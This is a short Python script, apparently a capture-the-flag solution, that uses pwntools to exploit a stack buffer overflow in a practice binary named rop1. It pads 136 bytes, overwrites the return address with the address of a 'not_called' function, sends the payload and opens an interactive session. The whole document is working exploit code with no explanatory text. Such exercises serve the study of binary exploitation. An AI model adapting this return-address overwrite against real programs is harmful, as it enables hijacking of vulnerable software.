from pwn import *

# Path to the binary
binary_path = './pwn/stack/rop-1/rop1'

# Start the process
io = process(binary_path)

# Load the binary
elf = ELF(binary_path)

# Find the offset to the return address
offset = 136  # Adjust this value based on your testing

# Address of the 'not_called' function
not_called_addr = elf.symbols['not_called']

# Create the payload
payload = b'A' * offset
payload += p32(not_called_addr)

# Send the payload
io.sendline(payload)

# Drop to an interactive shell
io.interactive()
